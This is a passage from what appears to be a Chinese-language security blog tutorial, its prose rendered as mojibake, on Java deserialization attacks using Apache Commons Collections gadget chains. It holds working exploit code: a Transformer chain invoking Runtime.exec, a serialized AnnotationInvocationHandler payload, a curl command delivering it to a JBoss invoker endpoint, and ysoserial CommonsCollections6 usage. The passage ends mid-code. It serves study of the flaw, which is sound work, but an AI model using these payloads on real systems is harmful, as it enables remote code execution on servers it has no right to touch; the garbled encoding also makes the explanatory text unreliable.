·ï¼Œå¯èƒ½æ˜¯å­—ç¬¦ä¸²æˆ–å…¶ä»–ç±»å‹ï¼‰ï¼Œé‚£ä¹ˆå°±éœ€è¦æ„é€ ä¸€ä¸ªTransformeré“¾ï¼Œå…ˆè·å¾—Runtimeç±»ï¼Œå†æ‰§è¡Œexec()æ–¹æ³•ã€‚</p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªTransformerç±»â€”â€”ConstantTransformerï¼Œå®ƒçš„åŠŸèƒ½æ˜¯ç›´æ¥å°†key/valueæ›¿æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546090891949.png" alt="1546090891949"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç”¨äº†ä¸€ä¸ªTransformerChainï¼ŒTransformedMapå…è®¸æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªTransformeré“¾ï¼Œä¸Šä¸€ä¸ªTransformerçš„ç»“æœå†ä¼ é€’ç»™ä¸‹ä¸€ä¸ªTransformerï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„é“¾æ¥å¼¹è®¡ç®—å™¨äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTransformer2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// InvokerTransformer Usage</span></span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">// Runtime</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                // (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(å‡½æ•°åï¼Œè¿”å›å€¼ç±»å‹)</span></span><br><span class="line">                <span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(å‡½æ•°åï¼Œå‡½æ•°å‚æ•°)</span></span><br><span class="line">                <span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line">                <span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"calc"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">        Map transformMap = TransformedMap.decorate(map, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">        transformMap.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">        transformMap.forEach((key, value) -&gt; System.out.println(key + <span class="string">":"</span> + value + <span class="string">"\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªChainå®é™…ä¸Šå°±æ˜¯æ‰§è¡Œ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h1 id="Annotation-Invocation-Handler"><a href="#Annotation-Invocation-Handler" class="headerlink" title="Annotation Invocation Handler"></a>Annotation Invocation Handler</h1><p>å‡è®¾æœ‰ä¸€ä¸ªä¸å®‰å…¨çš„ååºåˆ—åŒ–å‡½æ•°ï¼Œæˆ‘ä»¬å¦‚ä½•å€ŸåŠ©Apache Commons Collectionsè¿›è¡Œå‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬ä¼ å…¥çš„ç±»å¿…é¡»æ˜¯ç¨‹åºé‡Œé¢å·²ç»å­˜åœ¨çš„ç±»ï¼ˆè¿™å·²ç»åœ¨ç¬¬ä¸€ç¯‡é‡ŒéªŒè¯ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªç±»ï¼Œå®ƒæ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š1ï¼‰è¯¥ç±»å­˜åœ¨äºé‚£ä¸ªä¸å®‰å…¨çš„ååºåˆ—åŒ–åº”ç”¨ä¸­ï¼›2ï¼‰è¯¥ç±»çš„readObject()è°ƒç”¨äº†å…ˆå‰è®¨è®ºçš„transformMap.checkSetValue()ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨æ„é€ ä¸€ä¸ªæ¶æ„ç±»è®©å…¶ååºåˆ—åŒ–ï¼Œæ¥ç€å®ƒè°ƒç”¨setValueæ–¹æ³•ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç äº†ã€‚</p><p>äºæ˜¯æˆ‘ä»¬çš„ç›®å…‰è½¬ç§»åˆ°äº†Annotation Invocation Handlerï¼Œå¯ä»¥çœ‹åˆ°åœ¨å…¶å±æ€§memberValuesä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œä¼šæ‰§è¡ŒsetValueæ–¹æ³•ï¼š</p><p><strong>æ³¨æ„ï¼šé«˜ç‰ˆæœ¬çš„javaå·²ç»ä¿®å¤äº†è¿™ä¸€é—®é¢˜ï¼Œå¦‚éœ€å¤ç°ä½¿ç”¨jdk8u66åŠä»¥å‰ç‰ˆæœ¬</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// æ­¤å¤„è§¦å‘ä¸€ç³»åˆ—çš„Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªAnnotationInvocationHandlerç±»ï¼Œå…ˆè®¾ç½®ä¸€ä¸ªä¸ä¸ºç©ºçš„mapï¼Œå†å°†å…¶ç”¨å…ˆå‰çš„Transformerè£…é¥°ï¼Œå†å°†å…¶åºåˆ—åŒ–ï¼Œç»™ä¸å®‰å…¨çš„ååºåˆ—åŒ–å‡½æ•°è¯»å–ï¼Œè¿™æ ·å°±å¯ä»¥è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œäº†ï¼š</p><p>è€ƒè™‘é€šè¿‡<code>if (memberType != null)</code>,ç»è¿‡äº‹åè°ƒè¯•å¯ä»¥çŸ¥é“memberTypesä¸­å­˜åœ¨ä¸€ä¸ª<code>&lt;&quot;value&quot;, java.lang.annotation.RetentionPolicy&gt;</code>çš„é”®å€¼å¯¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadæ—¶ï¼Œéœ€è¦ä¿è¯<code>name=&quot;value&quot;</code>å³<code>key=â€œvalue&quot;</code>ã€‚</p><p>è€ƒè™‘é€šè¿‡ç¬¬äºŒä¸ª<code>if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))</code>ï¼Œå³ä¿è¯ä¸¤è€…éƒ½ä¸æ»¡è¶³ï¼Œè¿™å¾ˆç®€å•ï¼Œä¼ å…¥çš„mapä¸­valueä¸è¦æ˜¯ä»¥ä¸Šä¸¤ç§ç±»å‹å³å¯ã€‚</p><p>æ ¹æ®ä¸Šè¿°æ€è·¯ï¼Œå¯ä»¥äº§ç”Ÿå¦‚ä¸‹payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadTransformedMap</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Transformer[] evilTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">// (Method)Runtime.class.getMethod("getRuntime", null)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">null</span>&#125;), <span class="comment">//getMethod(å‡½æ•°åï¼Œè¿”å›å€¼ç±»å‹)</span></span><br><span class="line"><span class="comment">// (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null)</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;), <span class="comment">//invoke(å‡½æ•°åï¼Œå‡½æ•°å‚æ•°)</span></span><br><span class="line"><span class="comment">// (java.lang.ProcessImpl)</span></span><br><span class="line"><span class="comment">// Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc")</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line"><span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">new Object[]&#123;"calc"&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer evilTransformerChain = <span class="keyword">new</span> ChainedTransformer(evilTransformers);</span><br><span class="line">Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innermap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">Map outermap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, evilTransformerChain);</span><br><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//è¿”å›"sun.reflect.annotation.AnnotationInvocationHandler"å¯¹è±¡</span></span><br><span class="line">Object instance = ctor.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outermap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">out.writeObject(instance);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">Object o=in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">        payloadTest();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">// è¿™é‡Œä¸ºæµ‹è¯•ä¸Šé¢çš„tansformæ˜¯å¦ä¼šè§¦å‘payload</span></span><br><span class="line"><span class="comment">// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">// onlyElement.setValue("foobar");</span></span><br><span class="line"></span><br><span class="line">ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>));</span><br><span class="line">in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç ï¼Œå¾—åˆ°ååºåˆ—åŒ–æ–‡ä»¶<code>payload.ser</code>ã€‚</p><h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><p>ä¸‹é¢æ‰¾ä¸€ä¸ªä¸å®‰å…¨çš„ååºåˆ—åŒ–å…¥å£å§ï¼Œä¸€èˆ¬Javaçš„RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰æˆ–æ˜¯å…¶ä»–æœåŠ¡éƒ½ä¸å…ç”¨åˆ°ååºåˆ—åŒ–ã€‚åœ¨org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)å°±å­˜åœ¨ä¸€ä¸ªä¸å®‰å…¨çš„ååºåˆ—åŒ–å…¥å£ï¼š</p><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546160655463.png" alt="1546160655463"></p><p>åœ¨JBossç½‘ç«™<a href="http://jbossas.jboss.org/downloads/ä¸Šä¸‹è½½ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„jbossï¼ˆä»¥ç‰ˆæœ¬6.1ä¸ºä¾‹ï¼‰ï¼Œåœ¨è™šæ‹Ÿæœºä¸­å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬çš„javaï¼ˆ8u66)ï¼Œå†è¿è¡Œjboss" target="_blank" rel="noopener">http://jbossas.jboss.org/downloads/ä¸Šä¸‹è½½ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„jbossï¼ˆä»¥ç‰ˆæœ¬6.1ä¸ºä¾‹ï¼‰ï¼Œåœ¨è™šæ‹Ÿæœºä¸­å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬çš„javaï¼ˆ8u66)ï¼Œå†è¿è¡Œjboss</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\anemone\Desktop\jboss<span class="literal">-6</span>.<span class="number">1.0</span>.Final\bin&gt; ./run.bat <span class="literal">-b</span> <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546173400906.png" alt="1546173400906"></p><p>æ¥ç€å°è¯•è§¦å‘Payloadï¼Œè¿™é‡Œå‡è®¾serveråœ°å€ä¸º192.168.80.141ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Î» curl http://192.168.80.141:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure><p><img src="/ååºåˆ—åŒ–-Commons-Collections-Javaååºåˆ—åŒ–æ¼æ´ä¸POP-Gadgets/1546172924442.png" alt="1546172924442"></p><p>å¯ä»¥çœ‹åˆ°è®¡ç®—å™¨è¢«å¼¹å‡ºã€‚</p><h1 id="é¢å‘å±æ€§ç¼–ç¨‹â€”â€”POP"><a href="#é¢å‘å±æ€§ç¼–ç¨‹â€”â€”POP" class="headerlink" title="é¢å‘å±æ€§ç¼–ç¨‹â€”â€”POP"></a>é¢å‘å±æ€§ç¼–ç¨‹â€”â€”POP</h1><p>å®ƒç±»ä¼¼äºROPï¼ˆé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ï¼ŒæPWNçš„éƒ½çŸ¥é“ä¸ºäº†ç»•è¿‡å †æ ˆä¸å¯æ‰§è¡Œå¾€å¾€ä¼šåˆ©ç”¨ä¸€äº›ç¨‹åºä¸­å·²æœ‰çš„ä»£ç ç‰‡æ®µï¼ˆgadgets)ï¼Œå°†è¿™äº›ç‰‡æ®µæ‹¼å‡‘èµ·æ¥å½¢æˆgadgets chainå®ŒæˆåŠŸèƒ½ã€‚</p><p>POP çš„gadgets chainå¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚ä»¥å‰é¢è®²åˆ°çš„POCæ¥è¯´ï¼Œæ„é€ çš„POP gadgatsé“¾ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">        AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">            TransformedMap.checkSetValue()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections6-amp-LazyMap"><a href="#CommonsCollections6-amp-LazyMap" class="headerlink" title="CommonsCollections6 &amp; LazyMap"></a>CommonsCollections6 &amp; LazyMap</h1><p>javaçš„é«˜ç‰ˆæœ¬ï¼ˆ8u151+ï¼‰ä¿®æ”¹äº†AnnotationInvocationHandlerï¼Œå¯¼è‡´æˆ‘ä»¬çš„POPé“¾å¤±æ•ˆï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦å¯»æ‰¾æ–°çš„POPï¼Œä¸è¿‡åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>å·¥å…·çš„CommonsCollections6 POPé“¾ç”ŸæˆPayloadï¼Œå¯ä»¥exploitã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Î» java -jar ysoserial.jar CommonsCollections6 <span class="string">"calc"</span> &gt; payload.ser</span><br><span class="line">Î» curl http://127.0.0.1:8080/invoker/<span class="built_in">readonly</span> --data-binary @payload.ser</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–å¯¹è±¡çš„Payloadä¸ºCommonsCollections6.javaï¼Œæ”¹å†™ä¸€ä¸‹å˜æˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> 